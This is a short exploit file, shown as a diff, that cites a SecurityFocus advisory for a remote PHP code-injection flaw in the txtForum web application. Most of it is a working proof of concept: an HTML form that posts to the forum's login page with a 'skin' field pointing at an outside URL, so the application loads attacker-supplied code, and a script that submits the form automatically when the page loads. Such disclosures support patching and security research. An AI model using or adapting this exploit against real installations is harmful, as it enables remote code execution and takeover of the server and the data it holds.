@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/17061/info
+
+txtForum is prone to a remote PHP code-injection vulnerability. 
+
+An attacker can exploit this issue to facilitate a compromise of the application and the underlying system; other attacks are also possible.
+
+<form action='http://www.example.com/txtforum104/login.php' method="post">
+<input type="text" name="login_username" value="admin"/>
+<input type="text" name="login_password" value="xyz"/>
+<input type="text" name="skin" value="http://www.example.com"/>
+<input type="submit">
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
